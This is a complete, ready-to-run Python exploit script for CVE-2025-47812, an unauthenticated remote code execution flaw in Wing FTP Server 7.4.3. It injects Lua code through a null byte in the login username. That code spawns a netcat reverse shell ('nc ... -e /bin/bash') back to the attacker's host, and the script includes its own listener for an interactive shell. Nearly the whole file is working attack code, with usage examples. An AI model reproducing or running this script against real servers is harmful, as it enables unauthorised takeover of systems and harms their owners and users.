#!/bin/python3

# Exploit Title : Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution (RCE)

import re
import requests
import argparse
import socket
from time import sleep
from threading import Thread, Event
from urllib.parse import quote

stop_event = Event()

def get_help() -> str:
    """
        Function for help menu.

        Args:
            None
        
        Returns:
            str: Help menu for the CVE-2025-47812 exploit.
    """
    return """
        Wing FTP Server <= 7.4.3 - Unauthenticated Remote Code Execution (RCE) Exploit
        CVE: CVE-2025-47812

    Usage:
        python3 exploit.py -t <target_url> [options]

    Options:
        -t, --target     Target Wing FTP Server URL (e.g., http://192.168.1.100)
        -u, --username   Username to authenticate (default: anonymous)
        -p, --password   Password to authenticate (default: empty)
        -lh, --lhost     Local host to listen for reverse shell (default: 127.0.0.1)
        -lp, --lport     Local port to listen for reverse shell (default: 31337)
        -ns, --no-shell  To specify the exploit to not span a temp shell. (Note if it set should manually set listener)
        -v, --verbose    Enable verbose/debug output
        -h, --help       Show this help message and exit

    Examples:
        Reverse Shell:
            python3 exploit.py -t http://192.168.1.100 -lh 192.168.1.150 -lp 4444 -v

        Bind Shell (experimental):
            python3 exploit.py -t http://192.168.1.100 -rh 192.168.1.100 -rp 4444

    Note:
        - Reverse shell is the default and preferred method.
        - Make sure 'nc' (netcat) is available on the target system.
        - Run a listener (or let the exploit handle it) before the shell triggers.

"""

def get_arguments() -> list:
    """
        Function to parse the arguments.

        Args:
            None
        
        Return:
            list: List of input arguments.

    """
    argparser = argparse.ArgumentParser(add_help=False, usage=argparse.SUPPRESS, exit_on_error=False)
    argparser.add_argument("-t", "--target")
    argparser.add_argument("-u", "--username")
    argparser.add_argument("-p", "--password")
    argparser.add_argument("-lh", "--lhost")
    argparser.add_argument("-lp", "--lport")
    argparser.add_argument("-ns","--no-shell", action="store_true")
    argparser.add_argument("-v", "--verbose", action="store_true")
    argparser.add_argument("-h", "--help", action="store_true")
    return argparser.parse_args()


def forge_request(target:str, username:str, password:str, lhost:str, lport:str, verbose:bool=False) -> tuple:
    """
        Function to forge request for exploitation.

        Args:
            target  (str): Target to exploit.
            username    (str): Username to use.
            password    (str): Password to use with username.
            lhost   (str): Local host for reverse shell.
            lport   (str): Local port for reverse shell.
            verbose (bool): To set verbose mode.

        Returns:
            tuple : Tuple with login_url, headers, payload
    """
    if verbose:
        print("[ + ] Forging the exploit request.")

    if not target.startswith("http://") and not target.startswith("https://"):
        target = "http://" + target

    login_url = target + "/loginok.html"

    headers = {
        "Host": target.split("//")[1].split("/")[0],
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
        "Accept-Language": "en-US",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": target + "/login.html",
        "Connection": "keep-alive",
        "Cookie": "client_lang=english",
    }

    encoded_username = quote(username)
    encoded_password = quote(password)

    payload = (
        f"username={encoded_username}%00]]%0dlocal+h+%3d+io.popen(\"bash+-c+'nc+{lhost}+{lport}+"
        f"-e+/bin/bash'\")%0dlocal+r+%3d+h%3aread(\"*a\")%0dh%3aclose()%0dprint(r)%0d--"
        f"&password={encoded_password}"
    )

    if verbose:
        print("[ + ] Exploit request was forged.")

    return login_url, headers, payload


def get_uid(login_url:str, headers:dict, payload:dict, verbose:bool) -> str:
    """
        Function to get the UID from the successfull login.

        Args:
            login_url   (str): Login url to login.
            headers     (dict): Dict of foreged headers.  
            payload     (dict): Payload for the exploit.
            verbose     (bool): To set verbose mode.

        Retruns:
            str : UID from the successfull login.
    """
    if verbose:
        print("[ + ] Extracting UID.")

    try:
        response = requests.post(login_url, headers=headers, data=payload, timeout=10)
        uid_match = re.search(r'UID=([^;]+)', response.headers.get("Set-Cookie", ""))

        if uid_match:
            uid = uid_match.group(1).strip()
            if verbose:
                print(f"[ + ] UID Extracted: {uid}")

            return uid
        else:
            print("[ ! ] UID not found in response. Exploit might have failed.")
            exit(1)

    except KeyboardInterrupt:
        stop_event.set()
        exit(1)

    except Exception as e:
        print(f"[ ! ] Exception while getting UID: {e}")
        exit(1)


def stage_exploit(uid:str, target:str, headers:dict, verbose:bool=False) -> None:
    """
        Function to stage the exploit on the target.

        Args:
            uid (str):  UID from the successfull login.
            target  (str): Target to exploit.
            headers (dict): Dict of foreged headers. 
            verbose (bool): To set verbose mode.

        Returns:
            None
    """
    if verbose:
        print("[ + ] Staging the exploit.")

    try:
        headers["Cookie"] = f"UID={uid}"
        url = target + "/dir.html"
        requests.get(url, headers=headers, timeout=10)

        if verbose:
            print("[ + ] Exploit staged.")
    
    except requests.Timeout:
        pass

    except KeyboardInterrupt:
        stop_event.set()
        exit(1)

    except requests.exceptions.RequestException as e:
        print(f"[ ! ] Error while staging exploit: {e}")


def spawn_shell(lhost:str, lport:str) -> None:
    """
        Funstion to spawn a temporary shell.

        Args:
            lhost   (str): Local host for reverse shell.
            lport   (str): Local port for reverse shell.

        Returns:
            None
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((lhost, int(lport)))
        sock.listen(1)

        print(f"[ + ] Listening on {lhost}:{lport} for reverse shell...")
        conn, addr = sock.accept()
        print(f"[ + ] Connection received from {addr[0]}:{addr[1]} ,type 'exit/quit' to exit the shell.")
        conn.settimeout(1.0)

        print("\n")

        while not stop_event.is_set():
            try:
                command = input("# ")

                if command.lower() in ["exit", "quit"]:
                    conn.sendall(b"exit\n")
                    conn.close()
                    break

                conn.sendall((command + "\n").encode())

                try:
                    data = conn.recv(4096)
                    if data:
                        print(data.decode(errors="ignore"), end="")

                except socket.timeout:
                    pass 

            except KeyboardInterrupt:
                stop_event.set()

    except Exception as e:
        print(f"[ ! ] Socket error: {e}")
        exit(1)

def main() -> str:
    """
        Main function to the exploit.

        Args:
            None

        Returns:
            None

    """
    args = get_arguments()

    if args.help:
        print(get_help())
        return

    target = args.target
    username = args.username if args.username else "anonymous"
    password = args.password if args.password else ""
    lhost = args.lhost if args.lhost else "127.0.0.1"
    lport = int(args.lport) if args.lport else 31337
    verbose = args.verbose

    if not target:
        print("Usage: python3 exploit.py --target <TARGET>")
        print("[-] Error: Target is required.")
        return

    print(f"""
    --------------------------------------------------
    Target   : {target}
    Username : {username}
    Password : {password}
    LHOST    : {lhost}
    LPORT    : {lport}
    --------------------------------------------------
    """)

    if not args.no_shell:
        listener_thread = Thread(target=spawn_shell, args=(lhost, lport),daemon=True)
        listener_thread.start()

        sleep(2)

    login_url, headers, payload = forge_request(target, username, password, lhost, lport, verbose)

    uid = get_uid(login_url, headers, payload, verbose)
    stage_exploit(uid, target, headers, verbose)

if __name__ == "__main__":
    main()